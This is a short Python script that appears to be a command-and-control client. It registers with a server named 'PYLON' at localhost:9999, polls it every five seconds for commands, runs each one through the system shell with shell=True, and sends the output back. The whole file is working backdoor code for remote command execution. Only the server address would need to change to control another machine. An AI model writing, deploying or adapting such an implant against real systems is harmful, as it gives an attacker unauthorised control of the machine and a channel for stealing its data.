import requests
import time
import json
import subprocess


PYLON_URL = "http://localhost:9999"

data = []


def do_command(command):
    output = subprocess.Popen(command, shell=True,
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              stdin=subprocess.PIPE)
    return output.stdout.read() + output.stderr.read()


def heartbeat(client_id):
    payload = {"id": client_id,
               "data": data,
               "action": "heartbeat"}

    r = requests.post(PYLON_URL, json=payload)
    if r.status_code == 200:  # Data successfully sent, so wipe it
        data[:] = []
    commands = json.loads(r.text)

    for command in commands:
        data.append({"cmd_id": command["cmd_id"], "result": do_command(command["command"])})


def register():
    r = requests.post(PYLON_URL, json={"action": "register"})
    if r.status_code == 200:
        client_id = json.loads(r.text)["client_id"]
        return client_id


if __name__ == "__main__":
    client_id = register()
    print("Succesfully Registered as Client ID: %s" % client_id)
    if client_id is not None:
        while True:
            heartbeat(client_id)
            time.sleep(5)

